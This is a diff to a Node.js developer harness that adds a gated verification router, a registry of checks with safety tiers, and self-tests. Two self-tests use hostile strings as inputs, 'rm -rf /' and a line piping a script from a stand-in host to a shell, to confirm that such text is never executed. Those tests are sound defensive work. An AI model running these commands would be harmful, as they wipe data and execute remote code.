@@ -43,12 +43,16 @@ function git(args) {
 // fixed `cmd.exe /c <bin> <args>` argv array avoids that failure while
 // keeping every argument a fixed literal, never interpolated from
 // untrusted input, and without turning on spawnSync's own shell option.
-function checkTool(bin, args) {
+function spawnMaybeWin(bin, args, opts) {
   const useCmdWrapper = IS_WIN && (bin === 'npm' || bin === 'npx');
   const spawnBin = useCmdWrapper ? 'cmd.exe' : bin;
   const spawnArgs = useCmdWrapper ? ['/c', bin, ...args] : args;
+  return spawnSync(spawnBin, spawnArgs, { cwd: REPO_ROOT, encoding: 'utf8', ...opts });
+}
+
+function checkTool(bin, args) {
   try {
-    const res = spawnSync(spawnBin, spawnArgs, { cwd: REPO_ROOT, encoding: 'utf8', timeout: 10000 });
+    const res = spawnMaybeWin(bin, args, { timeout: 10000 });
     if (res.error) {
       return res.error.code === 'ENOENT'
         ? { status: 'MISSING' }
@@ -594,6 +598,331 @@ function renderActiveTaskSection(lines, activeTask, workingTree) {
   lines.push(`  protected hits : ${liveHits.length ? liveHits.map((h) => h.surfaceId).join(', ') : '(none)'}`);
   lines.push(`  blockers       : ${t.blockers.length ? t.blockers.map((b) => `${b.reason} (from ${b.blockedFromPhase})`).join('; ') : '(none)'}`);
   lines.push(`  human decisions: ${t.humanDecisionsRequired.length ? t.humanDecisionsRequired.join('; ') : '(none recorded)'}`);
+  if (t.verification && t.verification.results && t.verification.results.length) {
+    lines.push(`  verification   : (last run ${t.verification.lastRunAt})`);
+    for (const r of t.verification.results) {
+      lines.push(`    ${r.status.padEnd(15)} ${r.checkId} — ${r.message}`);
+    }
+  } else {
+    lines.push('  verification   : (none run yet — see `task verify --plan`)');
+  }
+}
+
+// ---------------------------------------------------------------------
+// Harness 2 — verification router. Selects existing verify-* scripts by
+// task class + changed paths + declared verification; executes only
+// LOCAL_STATIC/LOCAL_LOGIC/LOCAL_BUILD checks automatically. Remote-read
+// requires --remote-read at invocation time; local-test-mutation and
+// production-mutation checks are never auto-executed by anything here —
+// there is deliberately no registered check with safety
+// PRODUCTION_MUTATION at all (see self-test).
+// ---------------------------------------------------------------------
+
+const SAFETY = {
+  LOCAL_STATIC: 'LOCAL_STATIC',
+  LOCAL_LOGIC: 'LOCAL_LOGIC',
+  LOCAL_BUILD: 'LOCAL_BUILD',
+  REMOTE_READ_ONLY: 'REMOTE_READ_ONLY',
+  LOCAL_TEST_MUTATION: 'LOCAL_TEST_MUTATION',
+  PRODUCTION_MUTATION: 'PRODUCTION_MUTATION',
+};
+const AUTO_EXECUTABLE_SAFETY = [SAFETY.LOCAL_STATIC, SAFETY.LOCAL_LOGIC, SAFETY.LOCAL_BUILD];
+
+// Synthetic checks run in-process (no subprocess) — pure inspection of
+// already-loaded state, never SQL, never a live call.
+function synthMigrationState() {
+  const files = getMigrationFiles();
+  const ceiling = files.length ? files[files.length - 1].number : null;
+  const evidence = (loadJSON('migration-evidence.json', { entries: [] }) || { entries: [] }).entries;
+  const freeze = loadJSON('freeze.json', null);
+  const coverage = summarizeMigrationCoverage(ceiling, evidence);
+  const summary = coverage.map((r) => `${r.range}:${r.status}`).join(', ');
+  return {
+    status: ceiling === null ? 'FAIL' : 'PASS',
+    message: `ceiling=${ceiling === null ? 'UNKNOWN' : ceiling}; freeze=${freeze && freeze.active ? 'ACTIVE' : 'INACTIVE/UNKNOWN'}; ${summary || '(no migrations found)'}`,
+  };
+}
+
+function synthSpecOnlyScope(changedPaths) {
+  const offenders = (changedPaths || []).filter((p) => p.startsWith('src/') || p.startsWith('supabase/migrations/'));
+  return offenders.length
+    ? { status: 'FAIL', message: `SPECIFICATION_ONLY task touched src/ or supabase/migrations/: ${offenders.join(', ')}` }
+    : { status: 'PASS', message: 'no src/ or supabase/migrations/ paths changed' };
+}
+
+const CHECK_REGISTRY = [
+  {
+    id: 'npm-verify',
+    description: 'tsc --noEmit + vite build',
+    category: 'BUILD',
+    safety: SAFETY.LOCAL_BUILD,
+    command: ['npm', 'run', 'verify'],
+    aliases: ['npm run verify', 'verify'],
+    timeoutMs: 180000,
+  },
+  {
+    id: 'harness-self-test',
+    description: 'Harness self-test suite',
+    category: 'HARNESS',
+    safety: SAFETY.LOCAL_LOGIC,
+    command: ['node', 'scripts/harness.cjs', 'self-test'],
+    aliases: ['harness self-test', 'npm run harness -- self-test'],
+    timeoutMs: 120000,
+  },
+  {
+    id: 'verify-tenant-surface',
+    description: 'static tenant-surface RLS/RPC tripwire (default mode)',
+    category: 'SECURITY',
+    safety: SAFETY.LOCAL_STATIC,
+    command: ['npm', 'run', 'verify:tenant-surface'],
+    aliases: ['npm run verify:tenant-surface', 'verify:tenant-surface', 'tenant-surface'],
+    pathRouteId: 'tenant-surface',
+    timeoutMs: 30000,
+  },
+  {
+    id: 'verify-tenant-surface-remote-read',
+    description: 'adds the one public list_public_tenants() live read (--remote-read)',
+    category: 'SECURITY',
+    safety: SAFETY.REMOTE_READ_ONLY,
+    command: ['npm', 'run', 'verify:tenant-surface', '--', '--remote-read'],
+    aliases: ['verify:tenant-surface --remote-read', 'tenant-surface-remote-read'],
+    pathRouteId: 'tenant-surface',
+    timeoutMs: 30000,
+  },
+  {
+    id: 'verify-tenant-surface-local-mutation',
+    description: 'anonymous INSERT/UPDATE negative tests (--local-mutation) — needs its own env vars, run manually outside the harness',
+    category: 'SECURITY',
+    safety: SAFETY.LOCAL_TEST_MUTATION,
+    command: null,
+    manualOnly: true,
+    aliases: ['verify:tenant-surface --local-mutation', 'tenant-surface-local-mutation'],
+    timeoutMs: 30000,
+  },
+  {
+    id: 'verify-resident-email-login',
+    description: 'static+logic resident email/login contract check',
+    category: 'SECURITY',
+    safety: SAFETY.LOCAL_STATIC,
+    command: ['node', 'scripts/verify-resident-email-login.cjs'],
+    aliases: ['verify-resident-email-login', 'resident-email-login'],
+    pathRouteId: 'resident-email-login',
+    timeoutMs: 30000,
+  },
+  {
+    id: 'verify-e0-containment',
+    description: 'static containment tripwire for the two E0 Edge Functions',
+    category: 'SECURITY',
+    safety: SAFETY.LOCAL_STATIC,
+    command: ['node', 'scripts/verify-e0-containment.cjs'],
+    aliases: ['verify-e0-containment', 'e0-containment', 'e0'],
+    pathRouteId: 'e0-containment',
+    timeoutMs: 30000,
+  },
+  {
+    id: 'verify-roster-reconciliation',
+    description: 'in-memory roster-reconciliation regression fixtures',
+    category: 'LOGIC',
+    safety: SAFETY.LOCAL_LOGIC,
+    command: ['npm', 'run', 'verify:roster-reconciliation'],
+    aliases: ['npm run verify:roster-reconciliation', 'verify:roster-reconciliation', 'roster-reconciliation'],
+    pathRouteId: 'roster-reconciliation',
+    timeoutMs: 30000,
+  },
+  {
+    id: 'verify-submission-status',
+    description: 'in-memory submission-status regression fixtures',
+    category: 'LOGIC',
+    safety: SAFETY.LOCAL_LOGIC,
+    command: ['npm', 'run', 'verify:submission-status'],
+    aliases: ['npm run verify:submission-status', 'verify:submission-status', 'submission-status'],
+    pathRouteId: 'submission-status',
+    timeoutMs: 30000,
+  },
+  {
+    id: 'migration-state-check',
+    description: 'migration ceiling/numbering + verified applied/unapplied evidence + freeze state (no SQL, no live read)',
+    category: 'MIGRATION',
+    safety: SAFETY.LOCAL_STATIC,
+    synthetic: synthMigrationState,
+    aliases: ['migration-state-check'],
+  },
+  {
+    id: 'spec-only-scope-check',
+    description: 'flags src/ or supabase/migrations/ changes on a SPECIFICATION_ONLY task',
+    category: 'ROUTER',
+    safety: SAFETY.LOCAL_STATIC,
+    synthetic: null, // filled in per-call — needs changedPaths, see buildAndMaybeRunPlan
+    aliases: ['spec-only-scope-check'],
+  },
+  {
+    id: 'ui-visual-verification',
+    description: 'desktop viewport, mobile viewport, console error check, route reload check',
+    category: 'MANUAL',
+    safety: SAFETY.LOCAL_STATIC,
+    manualOnly: true,
+    command: null,
+    aliases: ['ui-visual-verification', 'manual-visual-verification'],
+  },
+  {
+    id: 'security-manual-review',
+    description: 'manual diff/control-flow review may remain necessary',
+    category: 'MANUAL',
+    safety: SAFETY.LOCAL_STATIC,
+    manualOnly: true,
+    command: null,
+    aliases: ['security-manual-review', 'manual-security-review'],
+  },
+  {
+    id: 'live-read-only-audit-approval',
+    description: 'REQUIRES_EXPLICIT_REMOTE_APPROVAL — do not auto-run any live query for a LIVE_READ_ONLY_AUDIT task',
+    category: 'MANUAL',
+    safety: SAFETY.REMOTE_READ_ONLY,
+    manualOnly: true,
+    command: null,
+    aliases: ['live-read-only-audit-approval'],
+  },
+];
+
+function findCheck(id) {
+  return CHECK_REGISTRY.find((c) => c.id === id) || null;
+}
+
+// Matches a changed path against the module/table this check actually
+// covers. Re-verified against current source (not assumed) before writing
+// this: verify-roster-reconciliation.ts imports rosterReconciliation from
+// src/modules/roster-engine/lib/; verify-submission-status.ts covers
+// submissionStatus.ts + its two real call sites; verify-e0-containment.cjs
+// covers exactly the two named Edge Functions; verify-resident-email-login
+// covers migration 64; verify-tenant-surface covers databaseService.ts plus
+// the tenant/chief/platform-operator RPC migrations.
+const PATH_ROUTES = [
+  {
+    id: 'tenant-surface',
+    test: (p) => /tenant/i.test(p) || p === 'src/lib/databaseService.ts',
+  },
+  {
+    id: 'resident-email-login',
+    test: (p) => p.startsWith('src/modules/auth/') || p === 'supabase/migrations/64_resident_email_login_contract.sql',
+  },
+  {
+    id: 'roster-reconciliation',
+    test: (p) => p.startsWith('src/modules/roster-engine/'),
+  },
+  {
+    id: 'submission-status',
+    test: (p) => p === 'src/modules/shared/lib/submissionStatus.ts'
+      || /ComplianceNudgesView|submissionChaserAgent/.test(p),
+  },
+  {
+    id: 'e0-containment',
+    test: (p) => p.startsWith('supabase/functions/'),
+  },
+];
+
+// checkId -> path route id, derived from CHECK_REGISTRY so the routing
+// table and the registry can never silently drift apart.
+function checksForPathRoute(routeId) {
+  return CHECK_REGISTRY.filter((c) => c.pathRouteId === routeId).map((c) => c.id);
+}
+
+const TASK_CLASS_RULES = {
+  CODE_REFACTOR: [{ checkId: 'npm-verify' }],
+  PRODUCT_FEATURE: [{ checkId: 'npm-verify' }],
+  BUG_FIX: [{ checkId: 'npm-verify' }],
+  SECURITY_HARDENING: [{ checkId: 'npm-verify' }, { checkId: 'security-manual-review' }],
+  DATABASE_MIGRATION: [
+    { checkId: 'migration-state-check' },
+    { checkId: 'npm-verify', conditionalPathTest: (p) => /\.tsx?$/.test(p) },
+  ],
+  DOCUMENTATION_GOVERNANCE: [],
+  SPECIFICATION_ONLY: [{ checkId: 'spec-only-scope-check' }],
+  LIVE_READ_ONLY_AUDIT: [{ checkId: 'live-read-only-audit-approval' }],
+  TOOLING_INFRASTRUCTURE: [{ checkId: 'npm-verify' }, { checkId: 'harness-self-test' }],
+  UI_UX_CHANGE: [{ checkId: 'npm-verify' }, { checkId: 'ui-visual-verification' }],
+};
+
+function resolveDeclaredCommand(declared) {
+  const norm = String(declared).trim().toLowerCase();
+  return CHECK_REGISTRY.find((c) => (c.aliases || []).some((a) => a.toLowerCase() === norm)) || null;
+}
+
+// Pure selection logic — no execution, no I/O beyond what changedPaths /
+// task already carry. Safe to call from --plan or from the real run.
+function buildVerificationPlan(task, changedPaths) {
+  const byId = new Map(); // checkId -> { check, reasons: Set }
+  const skipped = []; // { checkId, reason }
+  const unregistered = []; // { declared }
+
+  const addSelected = (checkId, reason) => {
+    const check = findCheck(checkId);
+    if (!check) return;
+    if (!byId.has(checkId)) byId.set(checkId, { check, reasons: new Set() });
+    byId.get(checkId).reasons.add(reason);
+  };
+
+  for (const rule of TASK_CLASS_RULES[task.taskClass] || []) {
+    const check = findCheck(rule.checkId);
+    if (!check) continue;
+    if (rule.conditionalPathTest) {
+      const matches = (changedPaths || []).some(rule.conditionalPathTest);
+      if (!matches) {
+        skipped.push({ checkId: check.id, reason: 'TASK_CLASS (conditional — no matching changed paths)' });
+        continue;
+      }
+    }
+    addSelected(check.id, 'TASK_CLASS');
+  }
+
+  for (const route of PATH_ROUTES) {
+    if ((changedPaths || []).some(route.test)) {
+      for (const checkId of checksForPathRoute(route.id)) {
+        // Never auto-select a remote-read/local-mutation variant via path
+        // routing alone — only the default static check for that surface.
+        const check = findCheck(checkId);
+        if (check.safety === SAFETY.LOCAL_STATIC || check.safety === SAFETY.LOCAL_LOGIC || check.safety === SAFETY.LOCAL_BUILD) {
+          addSelected(checkId, 'PATH_MATCH');
+        }
+      }
+    }
+  }
+
+  for (const declared of task.declaredVerification || []) {
+    const check = resolveDeclaredCommand(declared);
+    if (check) {
+      addSelected(check.id, 'DECLARED');
+    } else {
+      unregistered.push({ declared });
+    }
+  }
+
+  return { selected: [...byId.values()], skipped, unregistered };
+}
+
+function summarizeFailureTail(res) {
+  const text = `${res.stdout || ''}\n${res.stderr || ''}`.trim();
+  if (!text) return `exit ${res.status}`;
+  const tail = text.slice(-300).replace(/\s+/g, ' ').trim();
+  return tail || `exit ${res.status}`;
+}
+
+// Executes exactly one check. Only ever called for AUTO_EXECUTABLE_SAFETY
+// checks, or a REMOTE_READ_ONLY check when the caller has already gated on
+// --remote-read having been passed at invocation.
+function executeCheck(check, changedPaths) {
+  const startedAt = new Date().toISOString();
+  if (check.synthetic || check.id === 'spec-only-scope-check') {
+    const r = check.id === 'spec-only-scope-check' ? synthSpecOnlyScope(changedPaths) : check.synthetic();
+    return { checkId: check.id, status: r.status, startedAt, finishedAt: new Date().toISOString(), exitCode: null, message: r.message };
+  }
+  const [bin, ...args] = check.command;
+  const res = spawnMaybeWin(bin, args, { timeout: check.timeoutMs || 60000 });
+  const finishedAt = new Date().toISOString();
+  if (res.error) {
+    return { checkId: check.id, status: 'FAIL', startedAt, finishedAt, exitCode: null, message: `spawn error: ${res.error.code || res.error.message}` };
+  }
+  const status = res.status === 0 ? 'PASS' : 'FAIL';
+  return { checkId: check.id, status, startedAt, finishedAt, exitCode: res.status, message: status === 'PASS' ? 'ok' : summarizeFailureTail(res) };
 }
 
 // ---------------------------------------------------------------------
@@ -757,7 +1086,7 @@ function renderHuman(f) {
 // Commands — status and self-test only. Nothing else is dispatched.
 // ---------------------------------------------------------------------
 
-const COMMANDS = ['status', 'self-test', 'task'];
+const COMMANDS = ['status', 'self-test', 'task', 'verify'];
 
 function cmdStatus(argv) {
   const facts = computeFacts();
@@ -787,8 +1116,101 @@ function cmdTask(argv) {
   process.exitCode = 1;
 }
 
+function cmdVerify(rest) {
+  const { flags } = parseFlags(rest);
+  const task = loadActiveTask();
+  if (!task) return taskError('no active task — verification requires an active task');
+
+  const changedPaths = Array.from(new Set([
+    ...(getWorkingTree().changedTrackedFiles || []),
+    ...(task.expectedFiles || []),
+  ]));
+
+  const planMode = !!flags.plan;
+  const onlyId = flags.only;
+  const remoteReadAllowed = !!flags['remote-read'];
+
+  if (!planMode && task.phase !== 'VERIFYING') {
+    return taskError(`verify can only execute from phase VERIFYING (current: ${task.phase}) — run \`task phase VERIFYING\` first, or use --plan to inspect without running`);
+  }
+
+  let plan;
+  if (onlyId) {
+    const check = findCheck(onlyId);
+    if (!check) return taskError(`unknown check id: ${onlyId} (see CHECK_REGISTRY ids in scripts/harness.cjs)`);
+    plan = { selected: [{ check, reasons: new Set(['ONLY']) }], skipped: [], unregistered: [] };
+  } else {
+    plan = buildVerificationPlan(task, changedPaths);
+  }
+
+  for (const s of plan.skipped) process.stdout.write(`SKIP ${s.checkId} — ${s.reason}\n`);
+  for (const u of plan.unregistered) process.stdout.write(`UNREGISTERED — MANUAL REVIEW REQUIRED: ${u.declared}\n`);
+
+  if (planMode) {
+    for (const { check, reasons } of plan.selected) {
+      const wouldExecute = check.manualOnly
+        ? false
+        : AUTO_EXECUTABLE_SAFETY.includes(check.safety)
+          ? true
+          : check.safety === SAFETY.REMOTE_READ_ONLY ? remoteReadAllowed : false;
+      process.stdout.write(`${wouldExecute ? 'WOULD RUN ' : 'MANUAL_REQUIRED'} ${check.id} [${check.safety}] — ${[...reasons].join(', ')} — ${check.description}\n`);
+    }
+    return;
+  }
+
+  const results = [];
+  for (const s of plan.skipped) {
+    results.push({ checkId: s.checkId, selectedBecause: ['TASK_CLASS'], status: 'SKIP', startedAt: null, finishedAt: null, exitCode: null, message: s.reason });
+  }
+  const pending = [];
+  for (const { check, reasons } of plan.selected) {
+    const selectedBecause = [...reasons];
+    if (check.manualOnly) {
+      results.push({ checkId: check.id, selectedBecause, status: 'MANUAL_REQUIRED', startedAt: null, finishedAt: null, exitCode: null, message: check.description });
+      continue;
+    }
+    if (check.safety === SAFETY.REMOTE_READ_ONLY && !remoteReadAllowed) {
+      results.push({ checkId: check.id, selectedBecause, status: 'MANUAL_REQUIRED', startedAt: null, finishedAt: null, exitCode: null, message: 'REMOTE READ AVAILABLE — explicit approval required (re-run with --remote-read to include)' });
+      continue;
+    }
+    if (check.safety === SAFETY.LOCAL_TEST_MUTATION || check.safety === SAFETY.PRODUCTION_MUTATION) {
+      results.push({ checkId: check.id, selectedBecause, status: 'MANUAL_REQUIRED', startedAt: null, finishedAt: null, exitCode: null, message: `${check.safety} is never auto-executed by the harness — run manually per its own documented safeguards` });
+      continue;
+    }
+    if (check.safety === SAFETY.REMOTE_READ_ONLY) {
+      process.stdout.write(`*** REMOTE READ APPROVED FOR THIS RUN — executing ${check.id} ***\n`);
+    }
+    pending.push({ check, selectedBecause });
+  }
+  for (const u of plan.unregistered) {
+    results.push({ checkId: null, selectedBecause: ['DECLARED'], status: 'MANUAL_REQUIRED', startedAt: null, finishedAt: null, exitCode: null, message: `UNREGISTERED — MANUAL REVIEW REQUIRED: ${u.declared}` });
+  }
+  // Queue placeholders BEFORE running anything, so an interruption mid-run
+  // leaves not-yet-reached checks visibly distinct (BLOCKED) from ones that
+  // actually completed (PASS/FAIL).
+  for (const { check, selectedBecause } of pending) {
+    results.push({ checkId: check.id, selectedBecause, status: 'BLOCKED', startedAt: null, finishedAt: null, exitCode: null, message: 'queued — not yet started' });
+  }
+
+  task.verification = { lastRunAt: new Date().toISOString(), results };
+  writeActiveTaskAtomic(touchTask(task));
+
+  let anyFail = false;
+  for (const { check, selectedBecause } of pending) {
+    process.stdout.write(`RUNNING ${check.id}...\n`);
+    const r = executeCheck(check, changedPaths);
+    const idx = task.verification.results.findIndex((x) => x.checkId === check.id && x.status === 'BLOCKED');
+    task.verification.results[idx] = { checkId: check.id, selectedBecause, status: r.status, startedAt: r.startedAt, finishedAt: r.finishedAt, exitCode: r.exitCode, message: r.message };
+    writeActiveTaskAtomic(touchTask(task));
+    process.stdout.write(`${r.status} ${check.id} — ${r.message}\n`);
+    if (r.status === 'FAIL') anyFail = true;
+  }
+
+  if (anyFail) process.exitCode = 1;
+}
+
 function printUsage() {
-  process.stdout.write('usage: node scripts/harness.cjs <status [--json] | self-test | task <subcommand>>\n');
+  process.stdout.write('usage: node scripts/harness.cjs <status [--json] | self-test | task <subcommand> | verify [--plan|--only <id>|--remote-read]>\n');
 }
 
 // ---------------------------------------------------------------------
@@ -815,11 +1237,90 @@ function cmdSelfTest() {
     }
   };
 
-  // --- command surface: exactly status + self-test + task, nothing else ---
-  check('exposed command set is exactly {status, self-test, task}', () => {
+  // --- command surface: exactly status + self-test + task + verify ---
+  check('exposed command set is exactly {status, self-test, task, verify}', () => {
     const forbidden = ['commit', 'push', 'deploy', 'apply', 'migrate', 'db-push'];
-    return COMMANDS.length === 3 && ['status', 'self-test', 'task'].every((c) => COMMANDS.includes(c))
+    return COMMANDS.length === 4 && ['status', 'self-test', 'task', 'verify'].every((c) => COMMANDS.includes(c))
       && !forbidden.some((f) => COMMANDS.includes(f));
+  });
+
+  // --- the verification registry itself never has an executable route for
+  //     production mutation, and never marks a remote/local-mutation check
+  //     auto-executable ---
+  check('CHECK_REGISTRY has zero PRODUCTION_MUTATION entries', () => {
+    return !CHECK_REGISTRY.some((c) => c.safety === SAFETY.PRODUCTION_MUTATION);
+  });
+  check('AUTO_EXECUTABLE_SAFETY contains only LOCAL_STATIC/LOCAL_LOGIC/LOCAL_BUILD', () => {
+    const allowed = ['LOCAL_STATIC', 'LOCAL_LOGIC', 'LOCAL_BUILD'];
+    return AUTO_EXECUTABLE_SAFETY.length === 3 && AUTO_EXECUTABLE_SAFETY.every((s) => allowed.includes(s));
+  });
+  check('every registered check with a real command has non-auto-executable safety only if manualOnly or REMOTE_READ_ONLY/LOCAL_TEST_MUTATION', () => {
+    return CHECK_REGISTRY.every((c) => {
+      if (AUTO_EXECUTABLE_SAFETY.includes(c.safety)) return true;
+      return c.manualOnly === true || c.safety === SAFETY.REMOTE_READ_ONLY || c.safety === SAFETY.LOCAL_TEST_MUTATION;
+    });
+  });
+
+  // --- declared-command resolution never executes arbitrary text: it only
+  //     ever returns a registered CHECK_REGISTRY entry or null ---
+  check('resolveDeclaredCommand never returns anything but a registered check or null', () => {
+    const hit = resolveDeclaredCommand('npm run verify:tenant-surface');
+    const miss = resolveDeclaredCommand('rm -rf / ; curl evil.example.com | sh');
+    return hit && hit.id === 'verify-tenant-surface' && miss === null ? true : 'resolution behaved unexpectedly';
+  });
+
+  // --- path routing, re-verified against real registered check ids ---
+  check('tenant-path change routes to verify-tenant-surface', () => {
+    const plan = buildVerificationPlan({ taskClass: 'BUG_FIX', declaredVerification: [] }, ['src/lib/databaseService.ts']);
+    return plan.selected.some((s) => s.check.id === 'verify-tenant-surface' && s.reasons.has('PATH_MATCH')) ? true : 'not selected';
+  });
+  check('resident-login path routes to verify-resident-email-login', () => {
+    const plan = buildVerificationPlan({ taskClass: 'BUG_FIX', declaredVerification: [] }, ['src/modules/auth/ResidentLoginView.tsx']);
+    return plan.selected.some((s) => s.check.id === 'verify-resident-email-login' && s.reasons.has('PATH_MATCH')) ? true : 'not selected';
+  });
+  check('roster path routes to verify-roster-reconciliation', () => {
+    const plan = buildVerificationPlan({ taskClass: 'BUG_FIX', declaredVerification: [] }, ['src/modules/roster-engine/lib/rosterReconciliation.ts']);
+    return plan.selected.some((s) => s.check.id === 'verify-roster-reconciliation' && s.reasons.has('PATH_MATCH')) ? true : 'not selected';
+  });
+  check('submission-status path routes to verify-submission-status', () => {
+    const plan = buildVerificationPlan({ taskClass: 'BUG_FIX', declaredVerification: [] }, ['src/modules/shared/lib/submissionStatus.ts']);
+    return plan.selected.some((s) => s.check.id === 'verify-submission-status' && s.reasons.has('PATH_MATCH')) ? true : 'not selected';
+  });
+  check('Edge Function path routes to verify-e0-containment', () => {
+    const plan = buildVerificationPlan({ taskClass: 'BUG_FIX', declaredVerification: [] }, ['supabase/functions/payment-checkout/index.ts']);
+    return plan.selected.some((s) => s.check.id === 'verify-e0-containment' && s.reasons.has('PATH_MATCH')) ? true : 'not selected';
+  });
+  check('CODE_REFACTOR selects npm-verify by task class', () => {
+    const plan = buildVerificationPlan({ taskClass: 'CODE_REFACTOR', declaredVerification: [] }, []);
+    return plan.selected.some((s) => s.check.id === 'npm-verify' && s.reasons.has('TASK_CLASS')) ? true : 'not selected';
+  });
+  check('DOCUMENTATION_GOVERNANCE does not select npm-verify by default', () => {
+    const plan = buildVerificationPlan({ taskClass: 'DOCUMENTATION_GOVERNANCE', declaredVerification: [] }, ['docs/SOMETHING.md']);
+    return plan.selected.some((s) => s.check.id === 'npm-verify') ? 'npm-verify unexpectedly selected' : true;
+  });
+  check('SPECIFICATION_ONLY flags an unexpected src/ change', () => {
+    const r = synthSpecOnlyScope(['src/App.tsx']);
+    return r.status === 'FAIL' ? true : 'expected FAIL for a src/ change on a spec-only task';
+  });
+  check('SPECIFICATION_ONLY does not flag a docs-only change', () => {
+    const r = synthSpecOnlyScope(['docs/SOMETHING.md']);
+    return r.status === 'PASS' ? true : 'expected PASS for a docs-only change';
+  });
+  check('declared registered verification is included with reason DECLARED', () => {
+    const plan = buildVerificationPlan({ taskClass: 'DOCUMENTATION_GOVERNANCE', declaredVerification: ['npm run verify:roster-reconciliation'] }, []);
+    return plan.selected.some((s) => s.check.id === 'verify-roster-reconciliation' && s.reasons.has('DECLARED')) ? true : 'not included';
+  });
+  check('an unregistered declared command is captured, never resolved to a registry entry', () => {
+    const plan = buildVerificationPlan({ taskClass: 'DOCUMENTATION_GOVERNANCE', declaredVerification: ['rm -rf /'] }, []);
+    return plan.unregistered.some((u) => u.declared === 'rm -rf /') ? true : 'not captured as unregistered';
+  });
+  check('DATABASE_MIGRATION always selects migration-state-check', () => {
+    const plan = buildVerificationPlan({ taskClass: 'DATABASE_MIGRATION', declaredVerification: [] }, ['supabase/migrations/67_something.sql']);
+    return plan.selected.some((s) => s.check.id === 'migration-state-check') ? true : 'not selected';
+  });
+  check('DATABASE_MIGRATION skips npm-verify with a reason when no TS/source changed', () => {
+    const plan = buildVerificationPlan({ taskClass: 'DATABASE_MIGRATION', declaredVerification: [] }, ['supabase/migrations/67_something.sql']);
+    return plan.skipped.some((s) => s.checkId === 'npm-verify') ? true : 'not reported as skipped';
   });
 
   // --- task subcommand surface never contains a mutating-outside-state verb ---
@@ -884,6 +1385,20 @@ function cmdSelfTest() {
       env: { ...process.env, WORKSPC_ENG_DIR_OVERRIDE: dir },
     });
     const readSandboxTask = (dir) => JSON.parse(fs.readFileSync(path.join(dir, ACTIVE_TASK_FILE), 'utf8'));
+    const runVerify = (dir, args, timeoutMs) => spawnSync(process.execPath, [__filename, 'verify', ...args], {
+      cwd: REPO_ROOT, encoding: 'utf8', timeout: timeoutMs || 15000,
+      env: { ...process.env, WORKSPC_ENG_DIR_OVERRIDE: dir },
+    });
+    const advanceToVerifying = (dir, taskClass, expectedFiles) => {
+      runTask(dir, ['new', '--title', 'verify router test', '--class', taskClass]);
+      const planFile = path.join(dir, 'plan.json');
+      fs.writeFileSync(planFile, JSON.stringify({ expectedFiles: expectedFiles || [] }));
+      runTask(dir, ['plan', '--file', planFile]);
+      runTask(dir, ['phase', 'AWAITING_HUMAN_REVIEW']);
+      runTask(dir, ['approve', '--note', 'router self-test']);
+      runTask(dir, ['phase', 'IMPLEMENTING']);
+      runTask(dir, ['phase', 'VERIFYING']);
+    };
 
     try {
       const sbBasic = newSandbox();
@@ -967,6 +1482,75 @@ function cmdSelfTest() {
         runStatusJson(sbProtected);
         const after = fs.readFileSync(path.join(sbProtected, ACTIVE_TASK_FILE), 'utf8');
         return before === after ? true : 'sandboxed active-task.json changed after a status call';
+      });
+
+      check('verify requires phase VERIFYING to execute (refuses from IMPLEMENTING)', () => {
+        const d = newSandbox();
+        runTask(d, ['new', '--title', 'phase gate', '--class', 'BUG_FIX']);
+        runTask(d, ['phase', 'PLAN_READY']);
+        const r = runVerify(d, []);
+        return r.status !== 0 && /VERIFYING/.test(r.stderr) ? true : `exit ${r.status}: ${r.stderr}`;
+      });
+
+      check('`verify --plan` is read-only and requires no particular phase', () => {
+        const d = newSandbox();
+        runTask(d, ['new', '--title', 'plan mode', '--class', 'CODE_REFACTOR']);
+        const before = fs.readFileSync(path.join(d, ACTIVE_TASK_FILE), 'utf8');
+        const r = runVerify(d, ['--plan']);
+        const after = fs.readFileSync(path.join(d, ACTIVE_TASK_FILE), 'utf8');
+        return r.status === 0 && /npm-verify/.test(r.stdout) && before === after ? true : `exit ${r.status} stdout=${r.stdout} changed=${before !== after}`;
+      });
+
+      const sbPass = newSandbox();
+      check('PASS is recorded for an executed check', () => {
+        advanceToVerifying(sbPass, 'BUG_FIX', []);
+        const r = runVerify(sbPass, ['--only', 'migration-state-check']);
+        const t = readSandboxTask(sbPass);
+        const result = t.verification.results.find((x) => x.checkId === 'migration-state-check');
+        return r.status === 0 && result && result.status === 'PASS' ? true : `exit ${r.status}: ${JSON.stringify(result)}`;
+      });
+
+      const sbFail = newSandbox();
+      check('FAIL is recorded and returns a non-zero harness exit code', () => {
+        advanceToVerifying(sbFail, 'SPECIFICATION_ONLY', ['src/App.tsx']);
+        const r = runVerify(sbFail, ['--only', 'spec-only-scope-check']);
+        const t = readSandboxTask(sbFail);
+        const result = t.verification.results.find((x) => x.checkId === 'spec-only-scope-check');
+        return r.status !== 0 && result && result.status === 'FAIL' ? true : `exit ${r.status}: ${JSON.stringify(result)}`;
+      });
+
+      const sbSkipManual = newSandbox();
+      check('SKIP and MANUAL_REQUIRED results retain their reason', () => {
+        advanceToVerifying(sbSkipManual, 'DATABASE_MIGRATION', ['docs/SOMETHING.md']);
+        const r = runVerify(sbSkipManual, []);
+        const t = readSandboxTask(sbSkipManual);
+        const migVerify = t.verification.results.find((x) => x.checkId === 'npm-verify' && x.status === 'SKIP');
+        return r.status === 0 && migVerify && /no matching changed paths/.test(migVerify.message)
+          ? true : `not found or reason missing: ${JSON.stringify(t.verification && t.verification.results)}`;
+      });
+
+      const sbRemote = newSandbox();
+      check('a REMOTE_READ_ONLY check does not run without --remote-read', () => {
+        advanceToVerifying(sbRemote, 'BUG_FIX', []);
+        const r = runVerify(sbRemote, ['--only', 'verify-tenant-surface-remote-read']);
+        const t = readSandboxTask(sbRemote);
+        const result = t.verification.results.find((x) => x.checkId === 'verify-tenant-surface-remote-read');
+        return r.status === 0 && result && result.status === 'MANUAL_REQUIRED' && /explicit approval/.test(result.message)
+          ? true : `unexpected: ${JSON.stringify(result)}`;
+      });
+
+      const sbInterrupt = newSandbox();
+      check('interruption during a multi-check run leaves completed results durable', () => {
+        advanceToVerifying(sbInterrupt, 'DATABASE_MIGRATION', ['src/App.tsx']);
+        // Deliberately too short for npm-verify (a real tsc+vite build) to
+        // finish, but long enough for the fast synthetic
+        // migration-state-check ahead of it in the plan to complete first.
+        runVerify(sbInterrupt, [], 3000);
+        const t = readSandboxTask(sbInterrupt);
+        const mig = t.verification.results.find((x) => x.checkId === 'migration-state-check');
+        const npmv = t.verification.results.find((x) => x.checkId === 'npm-verify');
+        return mig && mig.status === 'PASS' && npmv && npmv.status === 'BLOCKED'
+          ? true : `mig=${mig && mig.status} npm=${npmv && npmv.status}`;
       });
 
